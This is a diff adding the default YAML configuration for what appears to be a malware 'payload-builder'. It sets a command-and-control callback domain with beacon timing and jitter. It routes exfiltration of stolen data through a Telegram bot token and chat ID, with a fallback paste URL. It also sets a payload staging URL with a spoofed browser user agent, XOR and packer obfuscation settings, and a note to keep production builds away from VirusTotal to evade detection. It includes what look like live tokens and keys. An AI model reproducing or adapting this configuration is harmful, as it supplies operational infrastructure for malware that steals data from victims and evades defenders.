@@ -1,0 +1,37 @@
+# payload-builder default config
+# override per-engagement as needed
+
+builder:
+  author: "db88"
+  version: "3.1"
+
+c2:
+  callback: "update-service.xyz"
+  port: 8443
+  protocol: "https"
+  beacon_interval: 30      # seconds between callbacks
+  jitter: 0.2              # 20% timing jitter
+
+exfil:
+  method: "telegram"
+  bot_token: "6194825173:AAH8kVz_QmR2xPlNbT7wOgK3fJnE9vMcDxo"
+  chat_id: "-1001847293651"
+  # fallback exfil if telegram is blocked
+  fallback_url: "https://paste.update-service.xyz/submit"
+
+staging:
+  url: "https://files.update-service.xyz/dl/"
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+virustotal:
+  api_key: "a3f8b2c1d4e5f67890abcdef12345678"
+  # dont scan prod builds obviously
+
+obfuscation:
+  xor_key: "d3v1lb0y"
+  packer_iterations: 3
+  strip_comments: true
+
+output:
+  directory: "output"
+  naming: "{template}_{timestamp}"
